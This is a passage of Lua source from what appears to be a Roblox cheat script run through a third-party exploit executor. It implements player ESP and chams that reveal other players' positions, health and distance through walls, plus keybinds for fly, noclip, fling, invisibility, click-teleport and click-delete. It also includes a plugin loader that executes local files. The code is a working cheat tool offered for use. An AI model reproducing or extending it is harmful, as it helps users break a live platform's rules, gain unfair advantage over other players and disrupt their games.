			execCmd(cmdbarText,Players.LocalPlayer,true)
		end
		if tabComplete then tabComplete:Disconnect() end
		wait()
		if not Cmdbar:IsFocused() then
			Cmdbar.Text = ""
			IndexContents('',true,false,true)
			if SettingsOpen == true then
				wait(0.2)
				Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
				CMDsF.Visible = false
			end
		end
		CMDsF.CanvasPosition = canvasPos
	end)

	Cmdbar.Focused:Connect(function()
		historyCount = 0
		canvasPos = CMDsF.CanvasPosition
		if SettingsOpen == true then
			wait(0.2)
			CMDsF.Visible = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
		end
		tabComplete = UserInputService.InputBegan:Connect(function(input,gameProcessed)
			if Cmdbar:IsFocused() then
				if input.KeyCode == Enum.KeyCode.Tab and topCommand ~= nil then
					autoComplete(topCommand)
				end
			else
				tabComplete:Disconnect()
			end
		end)
	end)

	ESPenabled = false
	CHMSenabled = false

	function round(num, numDecimalPlaces)
		local mult = 10^(numDecimalPlaces or 0)
		return math.floor(num * mult + 0.5) / mult
	end

	function ESP(plr)
		spawn(function()
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == plr.Name..'_ESP' then
					v:Destroy()
				end
			end
			wait()
			if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_ESP') then
				local ESPholder = Instance.new("Folder")
				ESPholder.Name = plr.Name..'_ESP'
				ESPholder.Parent = COREGUI
				repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
				for b,n in pairs (plr.Character:GetChildren()) do
					if (n:IsA("BasePart")) then
						local a = Instance.new("BoxHandleAdornment")
						a.Name = plr.Name
						a.Parent = ESPholder
						a.Adornee = n
						a.AlwaysOnTop = true
						a.ZIndex = 10
						a.Size = n.Size
						a.Transparency = 0.3
						a.Color = plr.TeamColor
					end
				end
				if plr.Character and plr.Character:FindFirstChild('Head') then
					local BillboardGui = Instance.new("BillboardGui")
					local TextLabel = Instance.new("TextLabel")
					BillboardGui.Adornee = plr.Character.Head
					BillboardGui.Name = plr.Name
					BillboardGui.Parent = ESPholder
					BillboardGui.Size = UDim2.new(0, 100, 0, 150)
					BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
					BillboardGui.AlwaysOnTop = true
					TextLabel.Parent = BillboardGui
					TextLabel.BackgroundTransparency = 1
					TextLabel.Position = UDim2.new(0, 0, 0, -50)
					TextLabel.Size = UDim2.new(0, 100, 0, 100)
					TextLabel.Font = Enum.Font.SourceSansSemibold
					TextLabel.TextSize = 20
					TextLabel.TextColor3 = Color3.new(1, 1, 1)
					TextLabel.TextStrokeTransparency = 0
					TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
					TextLabel.Text = 'Name: '..plr.Name
					TextLabel.ZIndex = 10
					local espLoopFunc
					local teamChange
					local addedFunc
					addedFunc = plr.CharacterAdded:Connect(function()
						if ESPenabled then
							espLoopFunc:Disconnect()
							teamChange:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
							ESP(plr)
							addedFunc:Disconnect()
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
						end
					end)
					teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
						if ESPenabled then
							espLoopFunc:Disconnect()
							addedFunc:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
							ESP(plr)
							teamChange:Disconnect()
						else
							teamChange:Disconnect()
						end
					end)
					local function espLoop()
						if COREGUI:FindFirstChild(plr.Name..'_ESP') then
							if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid') and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid') then
								local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
								TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | Studs: '..pos
							end
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
							espLoopFunc:Disconnect()
						end
					end
					espLoopFunc = game:GetService("RunService").RenderStepped:Connect(espLoop)
				end
			end
		end)
	end

	function CHMS(plr)
		spawn(function()
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == plr.Name..'_CHMS' then
					v:Destroy()
				end
			end
			wait()
			if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_CHMS') then
				local ESPholder = Instance.new("Folder")
				ESPholder.Name = plr.Name..'_CHMS'
				ESPholder.Parent = COREGUI
				repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
				for b,n in pairs (plr.Character:GetChildren()) do
					if (n:IsA("BasePart")) then
						local a = Instance.new("BoxHandleAdornment")
						a.Name = plr.Name
						a.Parent = ESPholder
						a.Adornee = n
						a.AlwaysOnTop = true
						a.ZIndex = 10
						a.Size = n.Size
						a.Transparency = 0.3
						a.Color = plr.TeamColor
					end
				end
				local addedFunc
				local teamChange
				local CHMSremoved
				addedFunc = plr.CharacterAdded:Connect(function()
					if CHMSenabled then
						ESPholder:Destroy()
						teamChange:Disconnect()
						repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
						CHMS(plr)
						addedFunc:Disconnect()
					else
						teamChange:Disconnect()
						addedFunc:Disconnect()
					end
				end)
				teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
					if CHMSenabled then
						ESPholder:Destroy()
						addedFunc:Disconnect()
						repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
						CHMS(plr)
						teamChange:Disconnect()
					else
						teamChange:Disconnect()
					end
				end)
				CHMSremoved = ESPholder.AncestryChanged:Connect(function()
					teamChange:Disconnect()
					addedFunc:Disconnect()
					CHMSremoved:Disconnect()
				end)
			end
		end)
	end

	function Locate(plr)
		spawn(function()
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == plr.Name..'_LC' then
					v:Destroy()
				end
			end
			wait()
			if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_LC') then
				local ESPholder = Instance.new("Folder")
				ESPholder.Name = plr.Name..'_LC'
				ESPholder.Parent = COREGUI
				repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
				for b,n in pairs (plr.Character:GetChildren()) do
					if (n:IsA("BasePart")) then
						local a = Instance.new("BoxHandleAdornment")
						a.Name = plr.Name
						a.Parent = ESPholder
						a.Adornee = n
						a.AlwaysOnTop = true
						a.ZIndex = 10
						a.Size = n.Size
						a.Transparency = 0.3
						a.Color = plr.TeamColor
					end
				end
				if plr.Character and plr.Character:FindFirstChild('Head') then
					local BillboardGui = Instance.new("BillboardGui")
					local TextLabel = Instance.new("TextLabel")
					BillboardGui.Adornee = plr.Character.Head
					BillboardGui.Name = plr.Name
					BillboardGui.Parent = ESPholder
					BillboardGui.Size = UDim2.new(0, 100, 0, 150)
					BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
					BillboardGui.AlwaysOnTop = true
					TextLabel.Parent = BillboardGui
					TextLabel.BackgroundTransparency = 1
					TextLabel.Position = UDim2.new(0, 0, 0, -50)
					TextLabel.Size = UDim2.new(0, 100, 0, 100)
					TextLabel.Font = Enum.Font.SourceSansSemibold
					TextLabel.TextSize = 20
					TextLabel.TextColor3 = Color3.new(1, 1, 1)
					TextLabel.TextStrokeTransparency = 0
					TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
					TextLabel.Text = 'Name: '..plr.Name
					TextLabel.ZIndex = 10
					local lcLoopFunc
					local addedFunc
					local teamChange
					addedFunc = plr.CharacterAdded:Connect(function()
						if ESPholder ~= nil and ESPholder.Parent ~= nil then
							lcLoopFunc:Disconnect()
							teamChange:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
							Locate(plr)
							addedFunc:Disconnect()
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
						end
					end)
					teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
						if ESPholder ~= nil and ESPholder.Parent ~= nil then
							lcLoopFunc:Disconnect()
							addedFunc:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
							Locate(plr)
							teamChange:Disconnect()
						else
							teamChange:Disconnect()
						end
					end)
					local function lcLoop()
						if COREGUI:FindFirstChild(plr.Name..'_LC') then
							if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid') and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid') then
								local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
								TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | Studs: '..pos
							end
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
							lcLoopFunc:Disconnect()
						end
					end
					lcLoopFunc = game:GetService("RunService").RenderStepped:Connect(lcLoop)
				end
			end
		end)
	end

	local bindsGUI = KeybindEditor
	local awaitingInput = false
	local keySelected = false

	function unkeybind(cmd,key)
		for i = #binds,1,-1 do
			if binds[i].COMMAND == cmd and binds[i].KEY == key then
				table.remove(binds, i)
			end
		end
		refreshbinds()
		updatesaves()
		if key == 'RightClick' or key == 'LeftClick' then
			notify('Keybinds Updated','Unbinded '..key..' from '..cmd)
		else
			notify('Keybinds Updated','Unbinded '..key:sub(14)..' from '..cmd)
		end
	end

	function refreshbinds()
		if Holder_2 then
			Holder_2:ClearAllChildren()
			Holder_2.CanvasSize = UDim2.new(0, 0, 0, 10)
			for i = 1, #binds do
				local YSize = 25
				local Position = ((i * YSize) - YSize)
				local newbind = Example_2:Clone()
				newbind.Parent = Holder_2
				newbind.Visible = true
				newbind.Position = UDim2.new(0,0,0, Position + 5)
				table.insert(shade2,newbind)
				table.insert(shade2,newbind.Text)
				table.insert(text1,newbind.Text)
				table.insert(shade3,newbind.Text.Delete)
				table.insert(text2,newbind.Text.Delete)
				local input = tostring(binds[i].KEY)
				local key
				if input == 'RightClick' or input == 'LeftClick' then
					key = input
				else
					key = input:sub(14)
				end
				newbind.Text.Text = key.." > "..binds[i].COMMAND.."  "..(binds[i].ISKEYUP and "(keyup)" or "(keydown)")
				Holder_2.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newbind.Text.Delete.MouseButton1Click:Connect(function()
					unkeybind(binds[i].COMMAND,binds[i].KEY)
				end)
			end
		end
	end

	refreshbinds()

	PositionsFrame.Delete.MouseButton1Click:Connect(function()
		execCmd('cpos')
	end)

	function refreshwaypoints()
		if #WayPoints > 0 or #pWayPoints > 0 then
			PositionsHint:Destroy()
		end
		if Holder_4 then
			Holder_4:ClearAllChildren()
			Holder_4.CanvasSize = UDim2.new(0, 0, 0, 10)
			local YSize = 25
			local num = 1
			for i = 1, #WayPoints do
				local Position = ((num * YSize) - YSize)
				local newpoint = Example_4:Clone()
				newpoint.Parent = Holder_4
				newpoint.Visible = true
				newpoint.Position = UDim2.new(0,0,0, Position + 5)
				newpoint.Text.Text = WayPoints[i].NAME
				table.insert(shade2,newpoint)
				table.insert(shade2,newpoint.Text)
				table.insert(text1,newpoint.Text)
				table.insert(shade3,newpoint.Text.Delete)
				table.insert(text2,newpoint.Text.Delete)
				table.insert(shade3,newpoint.Text.TP)
				table.insert(text2,newpoint.Text.TP)
				Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newpoint.Text.Delete.MouseButton1Click:Connect(function()
					execCmd('dpos '..WayPoints[i].NAME)
				end)
				newpoint.Text.TP.MouseButton1Click:Connect(function()
					execCmd("loadpos "..WayPoints[i].NAME)
				end)
				num = num+1
			end
			for i = 1, #pWayPoints do
				local Position = ((num * YSize) - YSize)
				local newpoint = Example_4:Clone()
				newpoint.Parent = Holder_4
				newpoint.Visible = true
				newpoint.Position = UDim2.new(0,0,0, Position + 5)
				newpoint.Text.Text = pWayPoints[i].NAME
				table.insert(shade2,newpoint)
				table.insert(shade2,newpoint.Text)
				table.insert(text1,newpoint.Text)
				table.insert(shade3,newpoint.Text.Delete)
				table.insert(text2,newpoint.Text.Delete)
				table.insert(shade3,newpoint.Text.TP)
				table.insert(text2,newpoint.Text.TP)
				Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newpoint.Text.Delete.MouseButton1Click:Connect(function()
					execCmd('dpos '..pWayPoints[i].NAME)
				end)
				newpoint.Text.TP.MouseButton1Click:Connect(function()
					execCmd("loadpos "..pWayPoints[i].NAME)
				end)
				num = num+1
			end
		end
	end

	refreshwaypoints()

	function refreshaliases()
		if #aliases > 0 then
			AliasHint:Destroy()
		end
		if Holder_3 then
			Holder_3:ClearAllChildren()
			Holder_3.CanvasSize = UDim2.new(0, 0, 0, 10)
			for i = 1, #aliases do
				local YSize = 25
				local Position = ((i * YSize) - YSize)
				local newalias = Example_3:Clone()
				newalias.Parent = Holder_3
				newalias.Visible = true
				newalias.Position = UDim2.new(0,0,0, Position + 5)
				newalias.Text.Text = aliases[i].CMD.." > "..aliases[i].ALIAS
				table.insert(shade2,newalias)
				table.insert(shade2,newalias.Text)
				table.insert(text1,newalias.Text)
				table.insert(shade3,newalias.Text.Delete)
				table.insert(text2,newalias.Text.Delete)
				Holder_3.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newalias.Text.Delete.MouseButton1Click:Connect(function()
					execCmd('removealias '..aliases[i].ALIAS)
				end)
			end
		end
	end

	local bindChosenKeyUp = false

	BindTo.MouseButton1Click:Connect(function()
		awaitingInput = true
		BindTo.Text = 'Press something'
	end)

	BindTriggerSelect.MouseButton1Click:Connect(function()
		bindChosenKeyUp = not bindChosenKeyUp
		BindTriggerSelect.Text = bindChosenKeyUp and "KeyUp" or "KeyDown"
	end)

	Add_2.MouseButton1Click:Connect(function()
		if keySelected then
			if string.find(Cmdbar_2.Text, "\\\\") then
				notify('Keybind Error','Only use one backslash to keybind multiple commands into one keybind or command')
			else
				addbind(Cmdbar_2.Text,keyPressed,bindChosenKeyUp)
				refreshbinds()
				updatesaves()
				if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
					notify('Keybinds Updated','Binded '..keyPressed..' to '..Cmdbar_2.Text)
				else
					notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to '..Cmdbar_2.Text)
				end
			end
		end
	end)

	Exit_2.MouseButton1Click:Connect(function()
		Cmdbar_2.Text = 'Command'
		BindTo.Text = 'Click to bind'
		bindChosenKeyUp = false
		BindTriggerSelect.Text = "KeyDown"
		keySelected = false
		KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
	end)

	function onInputBegan(input,gameProcessed)
		if awaitingInput then
			if input.UserInputType == Enum.UserInputType.Keyboard then
				keyPressed = tostring(input.KeyCode)
				BindTo.Text = keyPressed:sub(14)
			elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
				keyPressed = 'LeftClick'
				BindTo.Text = 'LeftClick'
			elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
				keyPressed = 'RightClick'
				BindTo.Text = 'RightClick'
			end
			awaitingInput = false
			keySelected = true
		end
		if not gameProcessed and #binds > 0 then
			for i,v in pairs(binds) do
				if not v.ISKEYUP then
					if input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower() then
						execCmd(v.COMMAND,Players.LocalPlayer)
					elseif input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick' then
						execCmd(v.COMMAND,Players.LocalPlayer)
					elseif input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick' then
						execCmd(v.COMMAND,Players.LocalPlayer)
					end
				end
			end
		end
	end

	function onInputEnded(input,gameProcessed)
		if not gameProcessed and #binds > 0 then
			for i,v in pairs(binds) do
				if v.ISKEYUP then
					if input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower() then
						execCmd(v.COMMAND,Players.LocalPlayer)
					elseif input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick' then
						execCmd(v.COMMAND,Players.LocalPlayer)
					elseif input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick' then
						execCmd(v.COMMAND,Players.LocalPlayer)
					end
				end
			end
		end
	end

	UserInputService.InputBegan:Connect(onInputBegan)
	UserInputService.InputEnded:Connect(onInputEnded)

	Fly.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglefly',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle fly')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle fly')
			end
		end
	end)

	Noclip.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglenoclip',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle noclip')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle noclip')
			end
		end
	end)

	Float.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglefloat',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle float')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle float')
			end
		end
	end)

	ClickTP.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('clicktp',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to click tp')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click tp')
			end
		end
	end)

	ClickDelete.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('clickdel',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to click delete')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click delete')
			end
		end
	end)

	Xray.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglexray',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle xray')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle xray')
			end
		end
	end)

	Swim.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('toggleswim',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle swim')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle swim')
			end
		end
	end)

	Fling.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglefling',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle fling')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle fling')
			end
		end
	end)

	Invisible.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('toggleinvis',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle invisible')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle invisible')
			end
		end
	end)

	Vehiclefly.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglevfly',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle vehiclefly')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle vehiclefly')
			end
		end
	end)

	VehicleNoclip.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglevnoclip',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle vehiclenoclip')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle vehiclenoclip')
			end
		end
	end)

	local function clicktpFunc()
		pcall(function()
			if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			getRoot(Players.LocalPlayer.Character).CFrame = IYMouse.Hit + Vector3.new(0,7,0)
		end)
	end

	IYMouse.Button1Down:Connect(function()
		for i,v in pairs(binds) do
			if v.COMMAND == 'clicktp' then
				local input = v.KEY
				if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) and Players.LocalPlayer.Character then
					clicktpFunc()
				elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Players.LocalPlayer.Character then
					clicktpFunc()
				elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) and Players.LocalPlayer.Character then
					clicktpFunc()
				end
			elseif v.COMMAND == 'clickdel' then
				local input = v.KEY
				if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
					pcall(function() IYMouse.Target:Destroy() end)
				elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
					pcall(function() IYMouse.Target:Destroy() end)
				elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) then
					pcall(function() IYMouse.Target:Destroy() end)
				end
			end
		end
	end)

	PluginsGUI = PluginEditor.background

	function addPlugin(name)
		if name:lower() == 'plugin file name' or name:lower() == 'iy_fe.iy' or name == 'iy_fe' then
			notify('Plugin Error','Please enter a valid plugin')
		else
			local file
			local fileName
			if name:sub(-3) == '.iy' then
				pcall(function() file = readfile(name) end)
				fileName = name
			else
				pcall(function() file = readfile(name..'.iy') end)
				fileName = name..'.iy'
			end
			if file then
				if not FindInTable(PluginsTable, fileName) then
					table.insert(PluginsTable, fileName)
					LoadPlugin(fileName)
					refreshplugins()
					pcall(eventEditor.Refresh)
				else
					notify('Plugin Error','This plugin is already added')
				end
			else
				notify('Plugin Error','Cannot locate file "'..fileName..'". Is the file in the correct folder?')
			end
		end
	end

	function deletePlugin(name)
		local pName = name..'.iy'
		if name:sub(-3) == '.iy' then
			pName = name
		end
		for i = #cmds,1,-1 do
			if cmds[i].PLUGIN == pName then
				table.remove(cmds, i)
			end
		end
		for i,v in pairs(CMDsF:GetChildren()) do
			if v.Name == 'PLUGIN_'..pName then
				v:Destroy()
			end
		end
		for i,v in pairs(PluginsTable) do
			if v == pName then
				table.remove(PluginsTable, i)
				notify('Removed Plugin',pName..' was removed')
			end
		end
		IndexContents('',true)
		refreshplugins()
	end

	function refreshplugins(dontSave)
		if #PluginsTable > 0 then
			PluginsHint:Destroy()
		end
		if Holder_5 then
			Holder_5:ClearAllChildren()
			Holder_5.CanvasSize = UDim2.new(0, 0, 0, 10)
			for i,v in pairs(PluginsTable) do
				local pName = v
				local YSize = 25
				local Position = ((i * YSize) - YSize)
				local newplugin = Example_5:Clone()
				newplugin.Parent = Holder_5
				newplugin.Visible = true
				newplugin.Position = UDim2.new(0,0,0, Position + 5)
				newplugin.Text.Text = pName
				table.insert(shade2,newplugin)
				table.insert(shade2,newplugin.Text)
				table.insert(text1,newplugin.Text)
				table.insert(shade3,newplugin.Text.Delete)
				table.insert(text2,newplugin.Text.Delete)
				Holder_5.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newplugin.Text.Delete.MouseButton1Click:Connect(function()
					deletePlugin(pName)
				end)
			end
			if not dontSave then
				updatesaves()
			end
		end
	end

	local PluginCache
	function LoadPlugin(val,startup)
		local plugin

		function CatchedPluginLoad()
			plugin = loadfile(val)()
		end

		function handlePluginError(plerror)
			notify('Plugin Error','An error occurred with the plugin, "'..val..'" and it could not be loaded')
			if FindInTable(PluginsTable,val) then
				for i,v in pairs(PluginsTable) do
					if v == val then
						table.remove(PluginsTable,i)
					end
				end
			end
			updatesaves()

			print("Original Error: "..tostring(plerror))
			print("Plugin Error, stack traceback: "..tostring(debug.traceback()))

			plugin = nil

			return false
		end

		xpcall(CatchedPluginLoad, handlePluginError)

		if plugin ~= nil then
			if not startup then
				notify('Loaded Plugin',"Name: "..plugin["PluginName"].."\n".."Description: "..plugin["PluginDescription"])
			end
			addcmdtext('',val)
			addcmdtext(string.upper('--'..plugin["PluginName"]),val,plugin["PluginDescription"])
			for i,v in pairs(plugin["Commands"]) do 
				local cmdExt = ''
				local cmdName = i
				local function handleNames()
					cmdName = i
					if findCmd(cmdName..cmdExt) then
						if isNumber(cmdExt) then
							cmdExt = cmdExt+1
						else
							cmdExt = 1
						end
						handleNames()
					else
						cmdName = cmdName..cmdExt
					end
				end
				handleNames()
				addcmd(cmdName, v["Aliases"], v["Function"], val)
				if v["ListName"] then
					local newName = v.ListName
					local cmdNames = {i,unpack(v.Aliases)}
					for i,v in pairs(cmdNames) do
						newName = newName:gsub(v,v..cmdExt)
					end
					addcmdtext(newName,val,v["Description"])
				else
					addcmdtext(cmdName,val,v["Description"])
				end
			end
			IndexContents('',true)
		elseif plugin == nil then
			plugin = nil
		end
	end

	function FindPlugins()
		if PluginsTable ~= nil and type(PluginsTable) == "table" then
			for i,v in pairs(PluginsTable) do
				LoadPlugin(v,true)
			end
			refreshplugins(true)
		end
	end

	AddPlugin.MouseButton1Click:Connect(function()
		addPlugin(PluginsGUI.FileName.Text)
	end)

	Exit_3.MouseButton1Click:Connect(function()
		PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
		FileName.Text = 'Plugin File Name'
	end)

	Add_3.MouseButton1Click:Connect(function()
		PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, 310), "InOut", "Quart", 0.5, true, nil)
	end)

	Plugins.MouseButton1Click:Connect(function()
		if writefileExploit() then
			PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.5)
			SettingsHolder.Visible = false
		else
			notify('Incompatible Exploit','Your exploit is unable to use plugins (missing read/writefile)')
		end
	end)

	Close_4.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	addcmd('addalias',{},function(args, speaker)
		if #args < 2 then return end
		local cmd = string.lower(args[1])
		local alias = string.lower(args[2])
		for i,v in pairs(cmds) do
			if v.NAME:lower()==cmd or FindInTable(v.ALIAS,cmd) then
				customAlias[alias] = v
				aliases[#aliases + 1] = {CMD = cmd, ALIAS = alias}
				notify('Aliases Modified',"Added "..alias.." as an alias to "..cmd)
				updatesaves()
				refreshaliases()
				break
			end
		end
	end)

	addcmd('removealias',{},function(args, speaker)
		if #args < 1 then return end
		local alias = string.lower(args[1])
		if customAlias[alias] then
			local cmd = customAlias[alias].NAME
			customAlias[alias] = nil
			for i = #aliases,1,-1 do
				if aliases[i].ALIAS == tostring(alias) then
					table.remove(aliases, i)
				end
			end
			notify('Aliases Modified',"Removed the alias "..alias.." from "..cmd)
			updatesaves()
			refreshaliases()
		end
	end)

	addcmd('clraliases',{},function(args, speaker)
		customAlias = {}
		aliases = {}
		notify('Aliases Modified','Removed all aliases')
		updatesaves()
		refreshaliases()
	end)

	addcmd('serverinfo',{'info','sinfo'},function(args, speaker)
		spawn(function()
			local FRAME = Instance.new("Frame")
			local shadow = Instance.new("Frame")
			local PopupText = Instance.new("TextLabel")
			local Exit = Instance.new("TextButton")
			local ExitImage = Instance.new("ImageLabel")
			local background = Instance.new("Frame")
			local TextLabel = Instance.new("TextLabel")
			local TextLabel2 = Instance.new("TextLabel")
			local TextLabel3 = Instance.new("TextLabel")
			local Time = Instance.new("TextLabel")
			local appearance = Instance.new("TextLabel")
			local maxplayers = Instance.new("TextLabel")
			local name = Instance.new("TextLabel")
			local placeid = Instance.new("TextLabel")
			local playerid = Instance.new("TextLabel")
			local players = Instance.new("TextLabel")
			local CopyApp = Instance.new("TextButton")
			local CopyPlrID = Instance.new("TextButton")
			local CopyPlcID = Instance.new("TextButton")

			FRAME.Name = randomString()
			FRAME.Parent = PARENT
			FRAME.Active = true
			FRAME.BackgroundTransparency = 1
			FRAME.Position = UDim2.new(0.5, -130, 0, -500)
			FRAME.Size = UDim2.new(0, 250, 0, 20)
			FRAME.ZIndex = 10
			dragGUI(FRAME)

			shadow.Name = "shadow"
			shadow.Parent = FRAME
			shadow.BackgroundColor3 = currentShade2
